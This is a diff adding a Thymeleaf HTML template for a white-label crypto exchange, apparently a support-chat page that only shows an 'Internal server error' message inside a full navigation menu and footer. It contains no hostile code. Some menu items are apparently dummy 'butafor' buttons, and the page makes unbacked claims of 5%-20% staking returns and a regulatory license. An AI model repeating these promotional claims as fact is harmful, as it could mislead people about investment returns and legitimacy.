@@ -1,0 +1,505 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title th:text="'Customer Support Chat | ' + ${site_domain}"></title>
+    <link rel="icon" th:href="${site_icon}">
+    <link rel="stylesheet" href="../assets/css/root.min.css?v=2">
+    <link rel="stylesheet" href="../assets/css/toastr.css">
+</head>
+<body>
+<header class="header">
+    <div class="header__wrapper">
+        <div class="header__logo" onclick="location.replace('../')">
+            <div class="header__logo-icon">
+                <img style="width: 30px; margin-bottom: -3px;" th:src="${site_icon}">
+            </div>
+            <th:block th:text="${site_name}"></th:block>
+        </div>
+        <div class="header__links">
+            <div class="header__links-wrapper">
+                <a class="header__link" href="../trading">
+                    Spot trading
+                </a>
+                <a class="header__link" href="swap">
+                    Swap
+                    <span class="header__link-new">0%</span>
+                </a>
+                <div class="header__link header__link-trade">
+                    <div class="header__link-wrapper">
+                        Derivatives
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link butafor__btn" href="#">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/futures.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Futures trading</div>
+                                <div class="header__more-description">
+                                    Perpetual or Quarterly Contracts settled in Crypto
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link butafor__btn" href="#">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/options.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Options trading</div>
+                                <div class="header__more-description">
+                                    Trade European-style Vanilla Options
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="header__link header__link-tools">
+                    <div class="header__link-wrapper">
+                        Tools
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link" href="../market-crypto">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/cap.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Market cap</div>
+                                <div class="header__more-description">
+                                    Most of the available crypto assets and sorts them based on the market capitalization
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../market-screener">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/screener.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Market screener</div>
+                                <div class="header__more-description">
+                                    Powerful tool that allows to filter instruments based on fundamental data and various technical indicators
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../technical-analysis">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/tech.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Technical analysis</div>
+                                <div class="header__more-description">
+                                    Advanced tool that displays ratings based on technical indicators
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../cross-rates">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/rates.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Cross rates</div>
+                                <div class="header__more-description">
+                                    Real-time quotes of the selected currencies in comparison to the other major currencies at a glance
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../heat-map">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/heat.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Currency heat map</div>
+                                <div class="header__more-description">
+                                    Quick overview of action in the currency markets. It lets you spot strong and weak currencies in real-time and how strong they are in relation to one another
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <a class="header__link" href="staking">
+                    Staking
+                    <span class="header__link-hot">HOT</span>
+                </a>
+                <div class="header__link header__link-earn">
+                    <div class="header__link-wrapper">
+                        Earn
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link" href="copy-trading">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/copy.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Copy trading</div>
+                                <div class="header__more-description">
+                                    Automate your trading by copying top traders strategies
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="trading-bots">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/bots.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Trading bots</div>
+                                <div class="header__more-description">
+                                    Intelligent pre-built trading bots help you auto-trade and earn all-day-long
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="launchpad">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/launchpad.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Launchpad</div>
+                                <div class="header__more-description">
+                                    Early easy access to new, high-quality crypto projects
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="space">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/space.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Space traveller</div>
+                                <div class="header__more-description">
+                                    Earn with your referral code
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="savings">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/savings.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Savings</div>
+                                <div class="header__more-description">
+                                    Value-added product for flexible returns
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="stake-eth20">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/eth20.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">ETH 2.0 Staking</div>
+                                <div class="header__more-description">
+                                    Don't just hold. Earn an additional 5%-20% locking return
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="header__link header__link-more">
+                    <div class="header__link-wrapper">
+                        More
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link" href="p2p">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/p2p.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">P2P trading</div>
+                                <div class="header__more-description">
+                                    Buy crypto from verified merchants
+                                </div>
+                            </div>
+                        </a>
+                        <a th:if="${payment_settings != null && payment_settings.transakEnabled}" class="header__more-link" href="buy-crypto">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/card.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Buy crypto with card</div>
+                                <div class="header__more-description">
+                                    Buy crypto via Card, Apple Pay, Google Pay
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="token-listing">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/tokenlist.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Token listing</div>
+                                <div class="header__more-description">
+                                    We can list your project on our exchange within 48 hours
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="institutions">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/inst.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Institutional home</div>
+                                <div class="header__more-description" th:text="${site_name} + ' offers the world`s most powerful suite of institutional crypto trading solutions'"></div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="cards">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/card.svg" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name" th:text="${site_name} + ' Card'"></div>
+                                <div class="header__more-description">
+                                    Order and ise your card anywhere Visa® debit cards are accepted, at 40M+ merchants worldwide.
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="ventures">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/ventures.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name" th:text="${site_name} + ' Ventures'"></div>
+                                <div class="header__more-description" th:text="${site_name} + ' Ventures is a fund focused on exploring high-quality projects with great potential'"></div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="header__right" style="display: none">
+            <div class="header__user">
+                <div class="header__user-btn">
+                    <div class="header__user-name">Admin</div>
+                    <div class="header__user-img">
+                        <picture>
+                            <source srcset="../assets/img/profile/avatar.svg" type="image/webp">
+                            <img src="../assets/img/profile/avatar.svg" alt="">
+                        </picture>
+                    </div>
+                </div>
+                <div class="header-menu__bg">
+                    <div class="header-menu">
+                        <div class="header-menu__overview">
+                            <div class="header-menu__overview-info">
+                                <div class="header-menu__overview-img">
+                                    <img src="../assets/img/header/wallet-overview.svg" alt="">
+                                </div>
+                                <div class="header-menu__overview-wrapper">
+                                    <div class="header-menu__overview-title">
+                                        Assets overview
+                                    </div>
+                                    <div class="header-menu__overview-value">
+                                        <span>0</span> USD
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="header-menu__overview-links">
+                                <a class="header-menu__overview-link" href="deposit">
+                                    <img src="../assets/img/header/wallet-add.svg" alt="">
+                                    Deposit
+                                </a>
+                                <a class="header-menu__overview-link" href="withdraw">
+                                    <img src="../assets/img/header/withdraw.svg" alt="">
+                                    Withdraw
+                                </a>
+                            </div>
+                        </div>
+                        <div class="header-menu__links">
+                            <a style="color: orange;" class="header-menu__links-link" href="../admin-panel">
+                                <img src="../assets/img/header/admin.svg" alt="">
+                                Admin Panel
+                            </a>
+
+                            <a class="header-menu__links-link" href="../profile/wallet">
+                                <img src="../assets/img/header/wallet-menu.svg" alt="">
+                                Wallet
+                            </a>
+                            <a class="header-menu__links-link" href="settings">
+                                <img src="../assets/img/header/settings.svg" alt="">
+                                Account settings
+                            </a>
+                            <a class="header-menu__links-link" href="verification">
+                                <img src="../assets/img/header/verification.svg" alt="">
+                                Verification
+                            </a>
+                            <a class="header-menu__links-link" href="promo-codes">
+                                <img src="../assets/img/header/codes.svg" alt="">
+                                Gift codes
+                            </a>
+                            <a class="header-menu__links-link" href="support">
+                                <img src="../assets/img/header/support.svg" alt="">
+                                Support                                 </a>
+                        </div>
+                        <div class="header-menu__user">
+                            <div class="header-menu__user-container">
+                                <a class="header-menu__user-img" href="#">
+                                    <picture>
+                                        <source srcset="../assets/img/profile/avatar.svg" type="image/webp">
+                                        <img src="../assets/img/profile/avatar.svg" alt="">
+                                    </picture>
+                                </a>
+                                <div class="header-menu__user-wrapper">
+                                    <div class="header-menu__user-nickname">Admin</div>
+                                    <div class="header-menu__user-mail">admin@mail.ru</div>
+                                </div>
+                            </div>
+                            <div class="header-menu__user-exit" onclick="location.replace('../api/auth/logout')">
+                                <img src="../assets/img/header/exit.svg" alt="">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="header__btn-mobile">
+                <svg width="35" height="35" viewBox="0 0 100 100">
+                    <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
+                    <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
+                    <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
+                </svg>
+            </div>
+        </div>
+
+        <div class="header__right">
+            <div class="header__user">
+                <a class="header-menu__links-link" href="../profile/wallet" style="color: white; display: inline-block; border: 1px solid silver; border-radius: 5px; padding: 11px;">
+                    Profile
+                </a>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main class="main not-found" style="height: 70%">
+    <div class="not-found__content">
+        <svg xmlns="http://www.w3.org/2000/svg" width="400px" height="400px" viewBox="0 0 48 48" id="Layer_2" data-name="Layer 2"><defs><style>.cls-1{fill:none;stroke:#000000;stroke-linecap:round;stroke-linejoin:round;}</style></defs><path class="cls-1" d="M42.58,13.78V6.36H40.72V4.5H25.86V6.36H24V17.5H22.14v1.86H20.28v1.86h-3.7v1.86H14.72v1.84H11V23.08H9.14V21.22H7.28V17.5H5.42V28.64H7.28V30.5H9.14v1.86H11v1.86h1.86v1.86h1.86V43.5h3.7V41.64H16.58V39.78h1.84V37.92h1.86V36.08h1.86v1.84H24V43.5h3.72V41.64H25.86V34.22h1.86V32.36h1.86V28.64h1.84V23.08h1.86v1.84h1.86v-3.7H31.42V17.5h7.44V15.64H33.28V13.78Zm-13-5.56H27.72V6.36h1.86Z"></path></svg>
+
+        <div class="not-found__title">Internal server error</div>
+
+        <a href="../.." class="buttons__02">Homepage</a>
+    </div>
+</main>
+<footer class="footer">
+    <div class="footer__container">
+        <div class="footer__top">
+            <div class="footer__info">
+                <div class="footer__logo">
+                    <div class="footer__logo-top">
+                        <div class="footer__logo-icon">
+                            <img style="width: 39px; margin-bottom: -3px;" th:src="${site_icon}">
+                        </div>
+                        <div class="footer__logo-text" th:text="${site_name}"></div>
+                    </div>
+                    <div class="footer__logo-line">
+                        <svg width="169" height="18" viewbox="0 0 169 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M21.2248 4.81993C23.8867 4.70895 26.0204 5.76327 27.2835 7.99677C28.2398 9.70312 29.3174 9.99445 31.1015 9.37018C35.683 7.76788 40.2859 6.22108 44.9173 4.77831C47.7861 3.88352 50.3552 4.36212 52.4604 6.74129C52.967 7.31008 54.2016 7.68465 54.9795 7.53205C58.9758 6.7413 62.9364 5.74245 66.9113 4.82685C71.3787 3.80027 75.8317 2.68354 80.3347 1.80955C83.1107 1.26852 85.7369 2.32977 87.4425 4.31357C89.9259 7.19216 92.9659 7.05342 96.0345 6.38753C101.822 5.13899 107.51 3.48815 113.283 2.17718C116.237 1.51129 119.277 1.01879 122.303 0.859255C123.688 0.782956 125.3 1.44885 126.506 2.22572C129.061 3.8627 131.887 3.74478 134.578 3.46039C142.035 2.66964 149.492 1.77487 156.864 0.463899C160.911 -0.257482 164.2 1.24769 167.619 2.59334C168.297 2.86386 169.181 4.32745 168.967 4.72975C168.461 5.68004 167.462 6.60257 166.434 7.00488C165.563 7.3517 164.279 7.1991 163.351 6.85228C158.534 5.04189 153.867 6.73436 149.157 7.26846C143.362 7.92048 137.596 8.80832 131.794 9.31468C130.046 9.46728 127.855 9.19676 126.499 8.25342C122.788 5.67309 119.042 6.52626 115.224 7.40718C109.122 8.81526 103.049 10.3205 96.9622 11.7771C91.9454 12.9771 87.5424 12.11 83.7459 8.43377C82.9323 7.64302 81.1197 7.19216 79.9779 7.45574C74.4758 8.69735 69.038 10.2234 63.5787 11.6661C59.9035 12.6303 56.2997 14.2118 52.3747 12.769C51.8895 12.5886 51.2971 12.5054 50.9403 12.1863C47.1153 8.74591 43.383 10.6187 39.5865 12.2557C36.9603 13.3863 34.3199 14.5169 31.5867 15.3424C28.1542 16.3828 25.5423 15.0927 23.0232 11.5759C22.1383 10.3343 21.3604 9.82798 19.8333 10.1262C15.3588 10.9863 11.4838 13.0326 7.99416 15.7724C4.83279 18.2626 2.41358 18.7551 0.401143 16.7921C-0.0555794 16.3481 -0.148338 14.7528 0.25843 14.3921C5.06115 10.0846 14.1385 5.18061 21.2391 4.82685L21.2248 4.81993Z" fill="#6544C6"></path>
+                        </svg>
+                    </div>
+                </div>
+                <div class="footer__description">
+                    Innovative cryptocurrency exchange with advanced financial services. We rely on blockchain technology to provide everything you need for wise trading and investment.
+                </div>
+                <br><br>
+                <div class="footer__label">Subscribe to our newsletter</div>
+                <div class="footer__wrapper">
+                    <input class="footer__input" type="email" placeholder="Enter email">
+                    <a class="footer__sing-up" id="footer_subscribe" href="#">
+                        Subscribe
+                    </a>
+                </div>
+            </div>
+            <div class="footer__links">
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Products
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="../trading">Spot trading</a>
+                        <a class="footer__link butafor__btn" href="../profile/wallet">Futures trading</a>
+                        <a class="footer__link butafor__btn" href="../profile/wallet">Options trading</a>
+                        <a class="footer__link" href="../profile/wallet">Wallet</a>
+                        <a class="footer__link" href="swap">Instant swap</a>
+                        <a class="footer__link" href="p2p">P2P trading</a>
+                        <a class="footer__link" href="staking">DeFi Staking</a>
+                        <a class="footer__link" href="cards" th:text="${site_name} + ' Visa Card'"></a>
+                    </div>
+                </div>
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Services
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="support">24/7 Support chat</a>
+                        <a class="footer__link" href="copy-trading">Copy trading</a>
+                        <a class="footer__link" href="trading-bots">Trading bots</a>
+                        <a class="footer__link" href="stake-eth20">ETH 2.0 staking</a>
+                        <a class="footer__link" href="launchpad">Launchpad</a>
+                        <a class="footer__link" href="savings">Savings</a>
+                        <a class="footer__link" href="ventures" th:text="${site_name} + ' ventures'"></a>
+                        <a th:if="${payment_settings != null && payment_settings.transakEnabled}" class="footer__link" href="buy-crypto">Buy crypto</a>
+                    </div>
+                </div>
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Information
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="../fees">Fees</a>
+                        <a class="footer__link" href="status">Platform status</a>
+                        <a class="footer__link" href="wallet-security">Wallet security</a>
+                        <a class="footer__link" href="../indices">Indices</a>
+                        <a class="footer__link" href="api-docs">Trading API</a>
+                        <a class="footer__link" href="token-listing">Token listing</a>
+                        <a class="footer__link" href="space">Referral system</a>
+                        <a class="footer__link" href="../bugbounty">Bug Bounty</a>
+                    </div>
+                </div>
+                <div class="footer__links-block">
+                    <div class="footer__link-title">
+                        Legal
+                    </div>
+                    <div class="footer__links-wrapper">
+                        <a class="footer__link" href="../terms">Terms of service</a>
+                        <a class="footer__link" href="../privacy-notice">Privacy notice</a>
+                        <a class="footer__link" href="../cookies-policy">Cookies policy</a>
+                        <a class="footer__link" href="../aml-kyc-policy">AML & KYC policy</a>
+                        <a class="footer__link" href="../risk">Risk Disclosure Statement</a>
+                        <a class="footer__link" href="../regulatory">Regulatory License</a>
+                        <a class="footer__link" href="../treatment">Special Treatment</a>
+                        <a class="footer__link" href="../law">Law Enforcement Requests</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer__bottom">
+            <div class="footer__sub-text">
+                In acceding to or using the Platform and the Site, you represent and warrant that you are fully aware of the risks associated with the transactions involving Digital Assets or the use of Platform. You agree and understand that you are solely responsible for determining the nature, potential value, suitability, and appropriateness of these risks for yourself, and that the Company does not give advice or recommendations regarding any Digital Asset, including the suitability and appropriateness of, and investment strategies for, any Digital Asset. You agree and understand that you access and use the Platform and the Site at your own risk. <br>
+                <span th:text="${site_name} + ' 2024 © All right reserved'"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- END FOOTER -->
+<script src="../assets/js/jquery-3.4.1.min.js"></script>
+<script src="../assets/js/app.min.js"></script>
+</body>
+</html>
